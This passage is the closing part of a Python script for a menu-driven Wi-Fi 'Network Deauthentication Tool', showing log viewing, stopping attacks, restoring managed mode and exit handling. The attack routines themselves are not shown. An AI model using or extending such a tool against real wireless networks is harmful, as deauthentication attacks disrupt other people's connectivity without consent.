                                                  capture_output=True, text=True)
                            if result.returncode == 0:
                                output = result.stdout
                                if "Mode:" in output:
                                    match = re.search(r'Mode:(\S+)', output)
                                    if match:
                                        print(f"    Mode: {match.group(1)}")
                                if "Channel:" in output:
                                    match = re.search(r'Channel (\d+)', output)
                                    if match:
                                        print(f"    Channel: {match.group(1)}")
                        
                    except Exception as e:
                        print(f"    Error: {e}")
            
            input("\nPress Enter to continue...")
        
        elif choice == '7':
            # View logs
            if os.path.exists(log_file):
                print(f"\nLog file: {log_file}")
                print("="*100)
                
                try:
                    with open(log_file, 'r') as f:
                        lines = f.readlines()
                    
                    if lines:
                        # Show last 20 entries
                        print("Last 20 entries:")
                        print("-"*100)
                        print(f"{'Timestamp':<20} {'Action':<15} {'Interface':<10} {'BSSID':<18} {'Status':<30}")
                        print("-"*100)
                        
                        start = max(1, len(lines) - 20)
                        for line in lines[start:]:
                            parts = line.strip().split(',')
                            if len(parts) >= 11:
                                print(f"{parts[0]:<20} {parts[1]:<15} {parts[3]:<10} {parts[4]:<18} {parts[10][:30]:<30}")
                    
                    print(f"\nTotal entries: {len(lines)-1}")
                    
                except Exception as e:
                    print(f"Error reading log file: {e}")
            else:
                print("Log file not found!")
            
            input("\nPress Enter to continue...")
        
        elif choice == '8':
            # Stop all attacks
            stop_all_attacks()
            input("\nPress Enter to continue...")
        
        elif choice == '9':
            # Restore managed mode
            if monitor_mode_enabled:
                print("\nRestoring Wi-Fi to managed mode...")
                restore_managed_mode()
            else:
                print("\nMonitor mode is not enabled.")
            
            input("\nPress Enter to continue...")
        
        elif choice == '0':
            # Exit
            print("\nExiting...")
            
            # Stop any running attacks
            stop_all_attacks()
            
            # Restore managed mode if needed
            if monitor_mode_enabled:
                answer = input("\nRestore Wi-Fi to managed mode? (y/n): ").lower()
                if answer == 'y':
                    restore_managed_mode()
            
            print("\nThank you for using the Network Deauthentication Tool!")
            print("Remember: Only use for authorized testing!")
            break
        
        else:
            print("\nInvalid option!")
            input("Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        stop_all_attacks()
        restore_managed_mode()
        print("Exiting...")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        logger.log("System_Error", "System", "", status=f"Unexpected error: {e}")
        restore_managed_mode()
